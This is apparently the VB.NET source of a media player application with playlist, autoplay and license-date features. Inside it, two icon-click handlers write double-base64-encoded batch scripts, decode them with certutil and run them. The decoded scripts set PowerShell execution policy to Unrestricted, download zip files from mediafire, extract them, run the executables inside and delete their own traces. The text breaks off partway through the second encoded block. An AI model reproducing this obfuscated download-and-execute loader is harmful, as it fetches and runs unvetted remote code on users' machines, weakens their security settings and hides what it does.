﻿Imports WMPLib
Public Class MediaPlayer
    Private Sub MediaPlayer_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If My.Settings.UseMySave = True Then
            UseMySaveToolStripMenuItem.Checked = True
            Call UseMySaveToolStripMenuItem_Click(Me, e)
        End If
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\PlayList.txt") Then
            Dim reader As New IO.StreamReader(Application.StartupPath & "\PlayList.txt")
            Try
                Do
                    Playlist.Items.Add(reader.ReadLine)
                Loop
            Catch ex As Exception
                reader.Close()
                Playlist.SelectedIndex = 0
                If My.Settings.AutoPlay = True Then
                    AxWindowsMediaPlayer1.URL = Playlist.SelectedItem
                    Timer1.Start()
                    CheckBox1.Checked = True
                End If
                If My.Settings.Repeat = True Then
                    CheckBox2.Checked = True
                End If
            End Try
        End If
        If Label11.Text = Nothing Then
            Label14.Visible = False
            Label9.Visible = True
            Label18.Visible = False
        End If
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Label10.Text = Times
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\License.Times") = False Then
            Label14.Visible = False
            Label9.Visible = True
            Label18.Visible = False
            GoTo EndSub
        End If
        Dim reader3 As New System.IO.StreamReader(Application.StartupPath & "\License.Times")
        Label12.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(reader3.ReadLine()))
        Dim date1 As Date = CDate(Label10.Text)
        Dim date2 As Date = CDate(Label12.Text)
        Dim result As Integer = DateTime.Compare(date1, date2)
        If result < 0 Then
            Label11.Text = "is earlier than"
            Label14.Visible = True
            Label9.Visible = False
            Label18.Visible = True
            GoTo EndSub
        ElseIf result = 0 Then
            Label11.Text = "is the same time as"
            Label14.Visible = False
            Label9.Visible = True
            Label18.Visible = False
            GoTo EndSub
        Else
            Label11.Text = "is later than"
            Label14.Visible = False
            Label9.Visible = True
            Label18.Visible = False
        End If
        GoTo EndSub
EndSub:
    End Sub
    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            My.Settings.AutoPlay = True
        Else
            My.Settings.AutoPlay = False
        End If
    End Sub
    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            My.Settings.Repeat = True
        Else
            My.Settings.Repeat = False
        End If
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Dim Nex As Integer
            Nex = Playlist.SelectedIndex
            If Me.AxWindowsMediaPlayer1.playState = WMPLib.WMPPlayState.wmppsStopped Then
                Me.Playlist.SelectedIndex = Nex + 1
                AxWindowsMediaPlayer1.URL = Playlist.SelectedItem
                Timer1.Start()
            Else
                Timer1.Start()
            End If
        Catch ex As Exception
            If My.Settings.Repeat = True Then
                Playlist.SelectedIndex = "0"
            End If
        End Try
    End Sub
    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Playlist.SelectedIndexChanged
        Try
            Timer1.Stop()
            AxWindowsMediaPlayer1.URL = ""
            AxWindowsMediaPlayer1.URL = Playlist.SelectedItem
            If My.Settings.AutoPlay = True Then
                AxWindowsMediaPlayer1.URL = Playlist.SelectedItem
                Timer1.Start()
                CheckBox1.Checked = True
            End If
            If My.Settings.Repeat = True Then
                CheckBox2.Checked = True
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Do While Panel1.Height < 555
            Panel1.Height = Panel1.Height + 1
        Loop
        Do While Panel1.Width < 1940
            Panel1.Width = Panel1.Width + 1
        Loop
        PictureBox1.Visible = False
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Do While Panel1.Height > 31
            Panel1.Height = Panel1.Height - 1
        Loop
        Do While Panel1.Width > 34
            Panel1.Width = Panel1.Width - 1
        Loop
        PictureBox1.Visible = True
    End Sub
    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        If (IO.File.Exists("AdvancedYoutubeDownloader.bat")) Then GoTo AdvancedYoutubeDownloader
        Call AdvancedYoutubeDownloader()
        GoTo EndSub
AdvancedYoutubeDownloader:
        Process.Start("AdvancedYoutubeDownloader.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub AdvancedYoutubeDownloader()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("echo OkFkdmFuY2VkWW91dHViZURvd25sb2FkZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXEFkdmFuY2VkWW91dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci5leGUgZ290byBBWUQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2VkWW91dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci5l>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eGUgZ290byBTdGFydEFZRA0KOkFZRCANCkBlY2hvIG9mZg0KdGl0bGUgQVlEDQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo KioqKg0KZWNobyAgICoqKi8vIFVwZGF0ZS1BWUQuYmF0IC8vIFdpbjEwIC8vKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo DQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo KioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0ICV+ZHAwXEFZRFwgcm1kaXIgL3Mg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3EgJX5kcDBcQVlEXA0KaWYgZXhpc3QgJX5kcDBcQVlETGluay5iYXQgZGVsIC9z>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXEFZRExpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxBZHZhbmNlZFlv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dXR1YmVEb3dubG9hZGVyLnppcCBkZWwgL3MgL3EgJX5kcDBcQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci56aXANCmlmIGV4aXN0ICV+ZHAwXEFZRC50eHQgZGVsIC9z>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXEFZRC50eHQNCmlmIGV4aXN0ICV+ZHAwXEFZRC5GaWxlIGRlbCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cyAvcSAlfmRwMFxBWUQuRmlsZQ0KaWYgZXhpc3QgJX5kcDBcQVlELnBzMSBkZWwg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcQVlELnBzMQ0KaWYgZXhpc3QgJX5kcDBcVW56aXBBWUQucHMx>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IGRlbCAvcyAvcSAlfmRwMFxVbnppcEFZRC5wczENCnBvd2Vyc2hlbGwgU2V0LUV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVzZXIgVW5yZXN0cmljdGVkDQpw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo b3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0ICJodHRwOi8vd3d3>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Lm1lZGlhZmlyZS5jb20vZmlsZS93YWhicGpxZm5uaXQ1eHovQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci56aXAiIC1PdXRGaWxlICJBWUQudHh0Ig0KY2QgJX5kcDAN>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo CmZpbmQgL0kgImhyZWY9J2h0dHA6Ly8iIEFZRC50eHQ+PkFZRExpbmsuYmF0DQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvIEV4aXQ+PkFZRExpbmsuYmF0DQplY2hvIEtFZGxkQzFEYjI1MFpXNTBJRUZa>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UkV4cGJtc3VZbUYwS1NCOElBMEtSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmY+PkFZ>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RC5GaWxlDQplY2hvIElDMXlaWEJzWVdObElDSm9jbVZtUFNjaUxDQWlldzBLZUhs>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Nk16SXhJbjBnZkNBTkNsTmxkQzFEYjI1MFpXNTA+PkFZRC5GaWxlDQplY2hvIElF>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RlpSRXhwYm1zdVltRjBEUW9rYUdGemFDNG5JRDBuRFFvb1IyVjBMVU52Ym5SbGJu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UWdRVmxFVEdsdWF5NWk+PkFZRC5GaWxlDQplY2hvIFlYUXBJSHdnRFFwR2IzSmxZ>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo V05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoWTJVZ0lpUm9ZWE5vTGljaUxDQWk+>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo PkFZRC5GaWxlDQplY2hvIERRcDZlWGcwTlNKOUlId2dEUXBUWlhRdFEyOXVkR1Z1>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZENCQldVUk1hVzVyTG1KaGRBMEtEUW9vUjJWMExVTnY+PkFZRC5GaWxlDQplY2hv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IGJuUmxiblFnUVZsRVRHbHVheTVpWVhRcElId2dEUXBHYjNKbFlXTm9MVTlpYW1W>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo amRDQjdKRjhnTFhKbGNHeGg+PkFZRC5GaWxlDQplY2hvIFkyVWdJbmg1ZWpNeU1T>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo SXNJQ0p3YjNkbGNuTm9aV3hzSUMxRGIyMXRZVzVrSUVsdWRtOXJaUzFYWldKU1pY>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RjE+PkFZRC5GaWxlDQplY2hvIFpYTjBJQ0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Q0JCV1VSTWFXNXJMbUpoZEEwS0tFZGxkQzFEYjI1MFpXNTA+PkFZRC5GaWxlDQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvIElFRlpSRXhwYm1zdVltRjBLU0I4SUEwS1JtOXlaV0ZqYUMxUFltcGxZM1Fn>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZXlSZklDMXlaWEJzWVdObElDSXU+PkFZRC5GaWxlDQplY2hvIGVta2lMQ0FpTG5w>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cGNDQXRUM1YwUm1sc1pTQkJaSFpoYm1ObFpGbHZkWFIxWW1WRWIzZHViRzloWkdW>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eUxucHA+PkFZRC5GaWxlDQplY2hvIGNDQW1KaUJsZUdsMEluMGdmQ0FOQ2xObGRD>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo MURiMjUwWlc1MElFRlpSRXhwYm1zdVltRjA+PkFZRC5GaWxlDQp0aW1lb3V0IC9U>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IDENCmNlcnR1dGlsIC1kZWNvZGUgQVlELkZpbGUgQVlELnBzMQ0KdGltZW91dCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo VCAxDQpQb3dlclNoZWxsLmV4ZSAtRmlsZSBBWUQucHMxIC1Ob0V4aXQNCnRpbWVv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dXQgL1QgMQ0KZmluZCAvSSAicG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZva2UtV2Vi>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UmVxdWVzdCBodHRwIiBBWURMaW5rLmJhdD4+QVlERG93bmxvYWRMaW5rLmJhdA0K>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2QgJX5kcDAgJiYgc3RhcnQgQVlERG93bmxvYWRMaW5rLmJhdA0KdGltZW91dCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo VCAyMg0KY2QgJX5kcDANCmlmIG5vdCBleGlzdCAlfmRwMFxBWURcIG1rZGlyICV+>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZHAwXEFZRFwNCmVjaG8gRXhwYW5kLUFyY2hpdmUgLVBhdGggIkFkdmFuY2VkWW91>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHViZURvd25sb2FkZXIuemlwIiAtRGVzdGluYXRpb25QYXRoICIlfmRwMFwiPj4i>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IlVuemlwQVlELnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmls>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZSBVbnppcEFZRC5wczEgLU5vRXhpdA0KdGltZW91dCAvVCAyDQppZiBleGlzdCAl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo fmRwMFxBWURcIHJtZGlyIC9zIC9xICV+ZHAwXEFZRFwNCmlmIGV4aXN0ICV+ZHAw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo XEFZRERvd25sb2FkTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXEFZRERvd25sb2Fk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo TGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXEFZRExpbmsuYmF0IGRlbCAvcyAvcSAl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo fmRwMFxBWURMaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBcQWR2YW5jZWRZb3V0dWJl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RG93bmxvYWRlci56aXAgZGVsIC9zIC9xICV+ZHAwXEFkdmFuY2VkWW91dHViZURv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo d25sb2FkZXIuemlwDQppZiBleGlzdCAlfmRwMFxBWUQudHh0IGRlbCAvcyAvcSAl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo fmRwMFxBWUQudHh0DQppZiBleGlzdCAlfmRwMFxBWUQuRmlsZSBkZWwgL3MgL3Eg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo JX5kcDBcQVlELkZpbGUNCmlmIGV4aXN0ICV+ZHAwXEFZRC5wczEgZGVsIC9zIC9x>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ICV+ZHAwXEFZRC5wczENCmlmIGV4aXN0ICV+ZHAwXFVuemlwQVlELnBzMSBkZWwg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcVW56aXBBWUQucHMxDQppZiBub3QgZXhpc3QgJX5kcDBcQWR2>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YW5jZWRZb3V0dWJlRG93bmxvYWRlclxBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVy>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo LmV4ZSBnb3RvIFdlYnBhZ2VBWUQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFuY2VkWW91>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci5leGUgZ290>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo byBTdGFydEFZRA0KOlN0YXJ0QVlEDQpjZCAlfmRwMFxBZHZhbmNlZFlvdXR1YmVE>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo b3dubG9hZGVyXCAmJiBzdGFydCBBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVyLmV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZQ0KaWYgZXhpc3QgJX5kcDBcQVlEXCBybWRpciAvcyAvcSAlfmRwMFxBWURcDQpp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZiBleGlzdCAlfmRwMFxBWURMaW5rLmJhdCBkZWwgL3MgL3EgJX5kcDBcQVlETGlu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ay5iYXQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFuY2VkWW91dHViZURvd25sb2FkZXIu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo emlwIGRlbCAvcyAvcSAlfmRwMFxBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVyLnpp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cA0KaWYgZXhpc3QgJX5kcDBcQVlELnR4dCBkZWwgL3MgL3EgJX5kcDBcQVlELnR4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dA0KaWYgZXhpc3QgJX5kcDBcQVlELkZpbGUgZGVsIC9zIC9xICV+ZHAwXEFZRC5G>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aWxlDQppZiBleGlzdCAlfmRwMFxBWUQucHMxIGRlbCAvcyAvcSAlfmRwMFxBWUQu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cHMxDQppZiBleGlzdCAlfmRwMFxVbnppcEFZRC5wczEgZGVsIC9zIC9xICV+ZHAw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo XFVuemlwQVlELnBzMQ0KZ290byBFbmRBWUQNCjpXZWJwYWdlQVlEDQpzdGFydCBo>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS93YWhicGpxZm5uaXQ1eHovQWR2>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YW5jZWRZb3V0dWJlRG93bmxvYWRlci56aXAuemlwDQpnb3RvIEVuZEFZRA0KOkVu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZEFZRA0KZ290byBFeGl0DQo6RXhpdA0KRXhpdA0K>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("certutil -decode AdvancedYoutubeDownloader.Files AdvancedYoutubeDownloader.bat")
        sb.AppendLine("start AdvancedYoutubeDownloader.bat")
        sb.AppendLine("if exist AdvancedYoutubeDownloader.Files del /s /q AdvancedYoutubeDownloader.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("AYD.bat", sb.ToString())
        Process.Start("AYD.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("AYD.bat")
    End Sub
    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        If (IO.File.Exists("Browser.bat")) Then GoTo Browser
        Call Browser()
        GoTo EndSub
Browser:
        Process.Start("Browser.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub Browser()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("echo OkJyb3dzZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4aXN0ICV+ZHAwXEJyb3dzZXJc>>Browser.Files")
        sb.AppendLine("echo QnJvd3Nlci5leGUgZ290byBCcm8NCmlmIGV4aXN0ICV+ZHAwXEJyb3dzZXJcQnJv>>Browser.Files")
        sb.AppendLine("echo d3Nlci5leGUgZ290byBTdGFydEJybw0KOkJybyANCkBlY2hvIG9mZg0KdGl0bGUg>>Browser.Files")
        sb.AppendLine("echo QnJvDQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>Browser.Files")
        sb.AppendLine("echo KioqKioqKioqKg0KZWNobyAgICoqKi8vIFVwZGF0ZS1Ccm8uYmF0IC8vIFdpbjEw>>Browser.Files")
        sb.AppendLine("echo IC8vKioqDQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>Browser.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0ICV+ZHAwXEJyb1wgcm1k>>Browser.Files")
        sb.AppendLine("echo aXIgL3MgL3EgJX5kcDBcQnJvXA0KaWYgZXhpc3QgJX5kcDBcQnJvTGluay5iYXQg>>Browser.Files")
        sb.AppendLine("echo ZGVsIC9zIC9xICV+ZHAwXEJyb0xpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxCcm93>>Browser.Files")
        sb.AppendLine("echo c2VyLnppcCBkZWwgL3MgL3EgJX5kcDBcQnJvd3Nlci56aXANCmlmIGV4aXN0ICV+>>Browser.Files")
        sb.AppendLine("echo ZHAwXEJyby50eHQgZGVsIC9zIC9xICV+ZHAwXEJyby50eHQNCmlmIGV4aXN0ICV+>>Browser.Files")
        sb.AppendLine("echo ZHAwXEJyby5GaWxlIGRlbCAvcyAvcSAlfmRwMFxCcm8uRmlsZQ0KaWYgZXhpc3Qg>>Browser.Files")
        sb.AppendLine("echo JX5kcDBcQnJvLnBzMSBkZWwgL3MgL3EgJX5kcDBcQnJvLnBzMQ0KaWYgZXhpc3Qg>>Browser.Files")
        sb.AppendLine("echo JX5kcDBcVW56aXBCcm8ucHMxIGRlbCAvcyAvcSAlfmRwMFxVbnppcEJyby5wczEN>>Browser.Files")
        sb.AppendLine("echo CnBvd2Vyc2hlbGwgU2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVz>>Browser.Files")
        sb.AppendLine("echo ZXIgVW5yZXN0cmljdGVkDQpwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJS>>Browser.Files")
        sb.AppendLine("echo ZXF1ZXN0ICJodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9haHVobmM4bDRm>>Browser.Files")
        sb.AppendLine("echo MGJkMGYvQnJvd3Nlci56aXAiIC1PdXRGaWxlICJCcm8udHh0Ig0KY2QgJX5kcDAN>>Browser.Files")
        sb.AppendLine("echo CmZpbmQgL0kgImhyZWY9J2h0dHA6Ly8iIEJyby50eHQ+PkJyb0xpbmsuYmF0DQpl>>Browser.Files")
        sb.AppendLine("echo Y2hvIEV4aXQ+PkJyb0xpbmsuYmF0DQplY2hvIEtFZGxkQzFEYjI1MFpXNTBJRUp5>>Browser.Files")
        sb.AppendLine("echo YjB4cGJtc3VZbUYwS1NCOElBMEtSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmY+PkJy>>Browser.Files")
        sb.AppendLine("echo by5GaWxlDQplY2hvIElDMXlaWEJzWVdObElDSm9jbVZtUFNjaUxDQWlldzBLZUhs>>Browser.Files")
        sb.AppendLine("echo Nk16SXhJbjBnZkNBTkNsTmxkQzFEYjI1MFpXNTA+PkJyby5GaWxlDQplY2hvIElF>>Browser.Files")
        sb.AppendLine("echo SnliMHhwYm1zdVltRjBEUW9rYUdGemFDNG5JRDBuRFFvb1IyVjBMVU52Ym5SbGJu>>Browser.Files")
        sb.AppendLine("echo UWdRbkp2VEdsdWF5NWk+PkJyby5GaWxlDQplY2hvIFlYUXBJSHdnRFFwR2IzSmxZ>>Browser.Files")
        sb.AppendLine("echo V05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoWTJVZ0lpUm9ZWE5vTGljaUxDQWk+>>Browser.Files")
        sb.AppendLine("echo PkJyby5GaWxlDQplY2hvIERRcDZlWGcwTlNKOUlId2dEUXBUWlhRdFEyOXVkR1Z1>>Browser.Files")
        sb.AppendLine("echo ZENCQ2NtOU1hVzVyTG1KaGRBMEtEUW9vUjJWMExVTnY+PkJyby5GaWxlDQplY2hv>>Browser.Files")
        sb.AppendLine("echo IGJuUmxiblFnUW5KdlRHbHVheTVpWVhRcElId2dEUXBHYjNKbFlXTm9MVTlpYW1W>>Browser.Files")
        sb.AppendLine("echo amRDQjdKRjhnTFhKbGNHeGg+PkJyby5GaWxlDQplY2hvIFkyVWdJbmg1ZWpNeU1T>>Browser.Files")
        sb.AppendLine("echo SXNJQ0p3YjNkbGNuTm9aV3hzSUMxRGIyMXRZVzVrSUVsdWRtOXJaUzFYWldKU1pY>>Browser.Files")
        sb.AppendLine("echo RjE+PkJyby5GaWxlDQplY2hvIFpYTjBJQ0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVk>>Browser.Files")
        sb.AppendLine("echo Q0JDY205TWFXNXJMbUpoZEEwS0tFZGxkQzFEYjI1MFpXNTA+PkJyby5GaWxlDQpl>>Browser.Files")
        sb.AppendLine("echo Y2hvIElFSnliMHhwYm1zdVltRjBLU0I4SUEwS1JtOXlaV0ZqYUMxUFltcGxZM1Fn>>Browser.Files")
        sb.AppendLine("echo ZXlSZklDMXlaWEJzWVdObElDSXU+PkJyby5GaWxlDQplY2hvIGVta2lMQ0FpTG5w>>Browser.Files")
        sb.AppendLine("echo cGNDQXRUM1YwUm1sc1pTQkNjbTkzYzJWeUxucHBjQ0FtSmlCbGVHbDBJbjBnZkNB>>Browser.Files")
        sb.AppendLine("echo TkNsTmw+PkJyby5GaWxlDQplY2hvIGRDMURiMjUwWlc1MElFSnliMHhwYm1zdVlt>>Browser.Files")
        sb.AppendLine("echo RjA+PkJyby5GaWxlDQp0aW1lb3V0IC9UIDENCmNlcnR1dGlsIC1kZWNvZGUgQnJv>>Browser.Files")
        sb.AppendLine("echo LkZpbGUgQnJvLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmls>>Browser.Files")
        sb.AppendLine("echo ZSBCcm8ucHMxIC1Ob0V4aXQNCnRpbWVvdXQgL1QgMQ0KZmluZCAvSSAicG93ZXJz>>Browser.Files")
        sb.AppendLine("echo aGVsbCAtQ29tbWFuZCBJbnZva2UtV2ViUmVxdWVzdCBodHRwIiBCcm9MaW5rLmJh>>Browser.Files")
        sb.AppendLine("echo dD4+QnJvRG93bmxvYWRMaW5rLmJhdA0KY2QgJX5kcDAgJiYgc3RhcnQgQnJvRG93>>Browser.Files")
        sb.AppendLine("echo bmxvYWRMaW5rLmJhdA0KdGltZW91dCAvVCAyMg0KY2QgJX5kcDANCmlmIG5vdCBl>>Browser.Files")
        sb.AppendLine("echo eGlzdCAlfmRwMFxCcm9cIG1rZGlyICV+ZHAwXEJyb1wNCmVjaG8gRXhwYW5kLUFy>>Browser.Files")
        sb.AppendLine("echo Y2hpdmUgLVBhdGggIkJyb3dzZXIuemlwIiAtRGVzdGluYXRpb25QYXRoICIlfmRw>>Browser.Files")
        sb.AppendLine("echo MFwiPj4iIlVuemlwQnJvLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4>>Browser.Files")
        sb.AppendLine("echo ZSAtRmlsZSBVbnppcEJyby5wczEgLU5vRXhpdA0KdGltZW91dCAvVCAyDQppZiBl>>Browser.Files")
        sb.AppendLine("echo eGlzdCAlfmRwMFxCcm9cIHJtZGlyIC9zIC9xICV+ZHAwXEJyb1wNCmlmIGV4aXN0>>Browser.Files")
        sb.AppendLine("echo ICV+ZHAwXEJyb0Rvd25sb2FkTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXEJyb0Rv>>Browser.Files")
        sb.AppendLine("echo d25sb2FkTGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXEJyb0xpbmsuYmF0IGRlbCAv>>Browser.Files")
        sb.AppendLine("echo cyAvcSAlfmRwMFxCcm9MaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBcQnJvd3Nlci56>>Browser.Files")
        sb.AppendLine("echo aXAgZGVsIC9zIC9xICV+ZHAwXEJyb3dzZXIuemlwDQppZiBleGlzdCAlfmRwMFxC>>Browser.Files")
        sb.AppendLine("echo cm8udHh0IGRlbCAvcyAvcSAlfmRwMFxCcm8udHh0DQppZiBleGlzdCAlfmRwMFxC>>Browser.Files")
        sb.AppendLine("echo cm8uRmlsZSBkZWwgL3MgL3EgJX5kcDBcQnJvLkZpbGUNCmlmIGV4aXN0ICV+ZHAw>>Browser.Files")
        sb.AppendLine("echo XEJyby5wczEgZGVsIC9zIC9xICV+ZHAwXEJyby5wczENCmlmIGV4aXN0ICV+ZHAw>>Browser.Files")
        sb.AppendLine("echo XFVuemlwQnJvLnBzMSBkZWwgL3MgL3EgJX5kcDBcVW56aXBCcm8ucHMxDQppZiBu>>Browser.Files")
        sb.AppendLine("echo b3QgZXhpc3QgJX5kcDBcQnJvd3NlclxCcm93c2VyLmV4ZSBnb3RvIFdlYnBhZ2VC>>Browser.Files")
        sb.AppendLine("echo cm8NCmlmIGV4aXN0ICV+ZHAwXEJyb3dzZXJcQnJvd3Nlci5leGUgZ290byBTdGFy>>Browser.Files")
